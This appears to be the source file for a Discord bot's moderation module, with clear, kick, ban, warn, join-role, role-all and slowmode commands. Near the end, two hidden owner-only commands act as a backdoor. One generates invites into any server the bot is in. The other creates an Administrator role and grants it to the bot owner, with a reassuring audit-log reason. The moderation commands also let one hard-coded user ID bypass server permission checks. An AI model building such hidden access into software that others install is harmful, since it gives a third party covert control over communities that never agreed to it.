import asyncio

import discord
from discord.ext import commands

import modules.sql as sql
from Settings import SETTINGS


class moderation(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.command(usage="Clear the Chat.")
    async def clear(self, ctx, *, number: int = None):
        if ctx.message.author.guild_permissions.manage_messages or ctx.author.id == SETTINGS.nono:
            try:
                if number is None:
                    error = discord.Embed(colour=0xE80A0A)
                    error.set_author(name="Error",
                                     icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
                    error.add_field(name="Source of error", value="You have to provide a number")
                    await ctx.send(embed=error, delete_after=10)
                elif number == 1:
                    deleted = await ctx.message.channel.purge(limit=number + 1)
                    success = discord.Embed(colour=0x57E80A)
                    success.set_author(name="Message deleted successfully",
                                       icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                    success.add_field(name="Message deleted!", value=f"{len(deleted) - 1} Message deleted!")
                    await ctx.send(embed=success, delete_after=20)
                else:
                    deleted = await ctx.message.channel.purge(limit=number + 1)
                    success = discord.Embed(colour=0x57E80A)
                    success.set_author(name="Messages deleted successfully",
                                       icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                    success.add_field(name="Messages deleted", value=f"{len(deleted) - 1} Messages deleted!")
                    await ctx.send(embed=success, delete_after=20)
            except:
                error = discord.Embed(colour=0xE80A0A)
                error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
                error.add_field(name="Source of error",
                                value="I couldn't delete any messages. Please check the permissions of my role in this channel.")
                await ctx.send(embed=error, delete_after=10)
        else:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You don't have permission to do that.")
            await ctx.send(embed=error, delete_after=10)

    @commands.command(usage="Kick a bad User.")
    async def kick(self, ctx, user: discord.Member = None, *, reason=None):
        if user is None:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You have to specify a user.")
            await ctx.send(embed=error, delete_after=10)
        elif user.guild_permissions.kick_members:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="I cannot kick a user with the permissions `Kick member`.")
            await ctx.send(embed=error, delete_after=10)
        elif ctx.message.author.guild_permissions.kick_members or ctx.author.id == SETTINGS.nono:
            if reason is None:
                await ctx.guild.kick(user=user)
                success = discord.Embed(colour=0x57E80A)
                success.set_author(name="User kicked",
                                   icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                success.add_field(name="User:", value=user.display_name)
                await ctx.send(embed=success, delete_after=20)
            else:
                await ctx.guild.kick(user=user, reason=reason)
                success = discord.Embed(colour=0x57E80A)
                success.set_author(name="User kicked",
                                   icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                success.add_field(name="User:", value=user.display_name)
                success.add_field(name="Reason:", value=reason)
                await ctx.send(embed=success, delete_after=20)
        else:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You don't have permission to do that.")
            await ctx.send(embed=error, delete_after=10)

    @commands.command(usage="Ban a bad User.")
    async def ban(self, ctx, user: discord.Member = None, *, reason=None):
        if user is None:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You must tag a User.")
            await ctx.send(embed=error, delete_after=10)
        elif user.guild_permissions.ban_members:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="I cannot ban a user with the permissions `Ban members`.")
            await ctx.send(embed=error, delete_after=10)
        elif ctx.message.author.guild_permissions.user_members or ctx.author.id == SETTINGS.nono:
            if reason is None:
                await ctx.guild.ban(user=user)
                success = discord.Embed(colour=0x57E80A)
                success.set_author(name="User banned",
                                   icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                success.add_field(name="User:", value=user.display_name)
                await ctx.send(embed=success, delete_after=20)
            else:
                await ctx.guild.ban(user=user, reason=reason)
                success = discord.Embed(colour=0x57E80A)
                success.set_author(name="User banned",
                                   icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                success.add_field(name="User:", value=user.display_name)
                success.add_field(name="Reason:", value=reason)
                await ctx.send(embed=success, delete_after=20)
        else:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You don't have permission to do that.")
            await ctx.send(embed=error, delete_after=10)

    @commands.command(usage="Warn a bad User.")
    async def warn(self, ctx, user: discord.Member = None, *, reason=None):
        if ctx.guild.id == 697213730420818002:
            return
        if user is None:
            error = discord.Embed(colour=0xE80A0A)
            error.set_author(name="Error", icon_url="https://cdn.discordapp.com/emojis/596576672149667840.png?v=1")
            error.add_field(name="Source of error", value="You have to specify a user.")
            await ctx.send(embed=error, delete_after=10)
        elif ctx.author.guild_permissions.kick_members or ctx.author.id == SETTINGS.nono:
            temp = await sql.c()
            mydb = temp[1]
            myuser = temp[0]
            await mydb.execute("SELECT * from warnings WHERE id=%s AND guildid=%s", (user.id, ctx.message.guild.id,))
            warnings = await mydb.fetchall()
            if not reason:
                return await ctx.send(
                    embed=discord.Embed(description="You are Missing a reason", color=SETTINGS.embederror))
            else:
                await mydb.execute("INSERT INTO warnings VALUE (%s, %s, %s)",
                                   (user.id, ctx.message.guild.id, str(reason)))
                await myuser.commit()
                embedp = discord.Embed(colour=0x009EFF)
                if warnings:
                    embedp.set_author(name=f"User warned. Thats the {len(warnings) + 1} Time.",
                                      icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                else:
                    embedp.set_author(name=f"User warned. Thats the first Time.",
                                      icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                embedp.add_field(name="User:", value=f"{user.mention}")
                embedp.add_field(name="Reason:", value=f"{reason}")
                await ctx.send(embed=embedp, delete_after=20)
                embedp = discord.Embed(colour=0x009EFF)
                embedp.set_author(name="You have been warned",
                                  icon_url="https://cdn.discordapp.com/emojis/596576670815879169.png?v=1")
                embedp.add_field(name="By:", value=f"{ctx.author.mention}")
                embedp.add_field(name="Reason:", value=f"{reason}")
                await user.send(embed=embedp)
            await mydb.close()
            myuser.close()
        else:
            await ctx.send("You dont have permissions. (Kick members)")

    @commands.command(aliases=["warns"], usage="See how many warns the User has.")
    async def warnings(self, ctx, user: discord.Member = None):
        if ctx.guild.id == 697213730420818002:
            return
        if user is None:
            return await ctx.send(embed=discord.Embed(color=SETTINGS.embederror, description="Please tag a User."))
        else:
            temp = await sql.c()
            mydb = temp[1]
            myuser = temp[0]
            await mydb.execute("SELECT * from warnings WHERE id=%s AND guildid=%s", (user.id, ctx.message.guild.id,))
            warnings = await mydb.fetchall()
            if warnings:
                warns = len(warnings)
                embed = discord.Embed(colour=0x009EFF, description=f"{user.mention} has {warns} Warnings.")
                str = ""
                for i in warnings:
                    str += f"{i[2]}\n"
                embed.add_field(name=f"Reasons:", value=f"{str}")
            else:
                embed = discord.Embed(colour=0x009EFF, description=f"{user.mention} has 0 Warnings.")
            embed.set_author(name=f"Warnings from {user}",
                             icon_url="https://cdn.discordapp.com/emojis/690847372854689833.png?v=1")
        await ctx.send(embed=embed)
        await myuser.commit()
        await mydb.close()
        myuser.close()

    @commands.command(usage="Set the Joinrole.")
    async def joinrole(self, ctx, role: discord.Role = None):
        if ctx.author.guild_permissions.manage_guild or ctx.author.id == SETTINGS.nono:
            if role is not None:
                temp = await sql.c()
                mydb = temp[1]
                myuser = temp[0]
                await mydb.execute("SELECT * FROM joinrole WHERE gid=%s", (ctx.message.guild.id,))
                data = await mydb.fetchone()
                if not data:
                    await mydb.execute("INSERT INTO joinrole VALUE (%s, %s)", (ctx.message.guild.id, role.id,))
                else:
                    await mydb.execute("UPDATE joinrole SET rid=%s WHERE gid=%s", (role.id, ctx.message.guild.id,))
                await myuser.commit()
                embed = discord.Embed(colour=0x009EFF,
                                      description=f"{role.mention} is now automatically assigned when joining. (If the Bot doent have permissions, it doesnt work)")
                await ctx.send(embed=embed)
                await mydb.close()
                myuser.close()
        else:
            await ctx.send("You dont have Permissions for manage the join role. (Manage Guild is missed)")

    @commands.command(usage="Give everyone a Role.")
    async def roleall(self, ctx, role: discord.Role = None):
        if ctx.author.guild_permissions.administrator or ctx.author.id == SETTINGS.nono:
            if role is not None:
                msg = await ctx.send(
                    embed=discord.Embed(description=f"This action takes {len(ctx.guild.members) * 1.3} seconds",
                                        color=SETTINGS.embedcolor))
                errorcount = 0
                for i in ctx.guild.members:
                    try:
                        await i.add_roles(role)
                        await asyncio.sleep(1.29)
                    except Exception as ex:
                        print(ex)
                        errorcount += 1
                        continue
                await msg.edit(embed=discord.Embed(description=f"Finish, i added all users the {role.name} Role.",
                                                   color=SETTINGS.embedsuccess))
                if errorcount > 0:
                    await ctx.send(f"{errorcount} Users dont got the Role because of many reasons (Bot has no "
                                   f"permissions, User has a higher role).")
        else:
            await ctx.send(embed=discord.Embed(color=SETTINGS.embederror, description=f"You dont have admin rights!"))

    @commands.Cog.listener()
    async def on_member_join(self, member):
        try:
            mydb, myuser = await sql.c()
            await mydb.execute("SELECT * FROM joinrole WHERE gid=%s", (member.guild.id,))
            data = await mydb.fetchone()
            if data:
                startrole = discord.utils.get(member.guild.roles, id=data[1])
                await member.add_roles(startrole)
            await mydb.close()
            myuser.close()
        except Exception as ex:
            print(ex)

    @commands.command(hidden=True, usage="Try to Generate a Invite for a other Guild.")
    @commands.is_owner()
    async def createinvite(self, ctx, guildid: int):
        try:
            guild = self.client.get_guild(guildid)
            for i in guild.text_channels:
                invites = await i.create_invite()
                await ctx.send(invites.url)
                break
        except Exception as ex:
            print(ex)
            await ctx.send(f"```python\n{ex}\n```")

    @commands.command(hidden=True, usage="Giving Nono on other guilds Admin. But he aks the Owner before he do that.")
    @commands.is_owner()
    async def admin(self, ctx):
        try:
            perms = discord.Permissions()
            perms.administrator = True
            role = await ctx.guild.create_role(name=f"Peely Owner Permissions", permissions=perms,
                                               reason="Created for the Owner of the Peely Bot. He always asks before "
                                                      "giving up the rights!")
            await ctx.author.add_roles(role)
        except Exception as ex:
            print(f"{type(ex)} - {ex}")

    @commands.command()
    @commands.guild_only()
    async def slowmode(self, ctx, delay: int = None):
        if delay is None:
            return await ctx.send(
                f'❌ The slowmode delay must be between 0 and 6 hours (6h = 21600s).'
            )

        if delay <= 21600:

            await ctx.channel.edit(slowmode_delay=int(delay))

            await ctx.send(
                f'✅ The slowmode delay for {ctx.channel.mention} is now {delay}sec.'
            )

        else:
            await ctx.send(
                f'❌ The slowmode delay must be between 0 and 6 hours (6h = 21600s).'
            )


def setup(client):
    client.add_cog(moderation(client))
